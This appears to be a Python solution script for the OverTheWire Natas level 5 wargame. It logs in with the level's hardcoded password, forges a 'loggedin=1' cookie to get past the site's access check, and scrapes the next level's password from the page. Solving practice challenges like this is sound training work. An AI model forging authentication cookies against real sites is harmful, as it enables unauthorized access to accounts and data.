#!usr/bin/env python

import re
import requests

#http header - request context 'user agent from http://natas5.natas.labs.overthewire.org'
username = 'natas5'
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'

cookies = { "loggedin" : "1" }
#testata = { "Referer" : "http://natas5.natas.labs.overthewire.org/"}
url = 'http://%s.natas.labs.overthewire.org' % username

session = requests.Session()

risultato = session.get(url, auth = (username, password), cookies = cookies )
contenuto = risultato.text

#print (contenuto)
print (re.findall('natas6 is (.*)</div>', contenuto) [0])
